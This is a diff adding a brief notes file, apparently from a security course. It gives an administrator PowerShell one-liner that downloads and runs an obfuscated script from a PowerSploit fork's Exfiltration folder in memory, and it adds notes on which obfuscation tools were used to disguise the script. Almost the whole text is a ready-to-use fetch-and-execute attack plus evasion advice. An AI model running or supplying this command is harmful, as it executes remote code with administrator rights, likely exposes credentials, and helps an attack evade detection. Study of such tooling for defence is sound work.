@@ -1,0 +1,9 @@
+# Jan 7, 2018 ML for Itec285
+
+# From Administrator Command Prompt, call like this: 
+C:\WINDOWS\system32>powershell "IEX (New-Object Net.WebClient).DownloadString('https://github.com/itec285/PowerSploit/raw/master/Exfiltration/Invoke-Mikelong2.ps1');Invoke-Mikelong"
+
+#Note that the FUNCTION is still called "Invoke-Mikelong" even though the filename is now Invoke-Mikelong2 on the obfuscated version.
+#Obfustcation on this one was done with the 10 day trial of ISESteroids : http://www.powertheshell.com/isesteroidsmanual/security-and-protection/
+# There are other obfuscators out there, notably https://github.com/danielbohannon/Invoke-Obfuscation
+
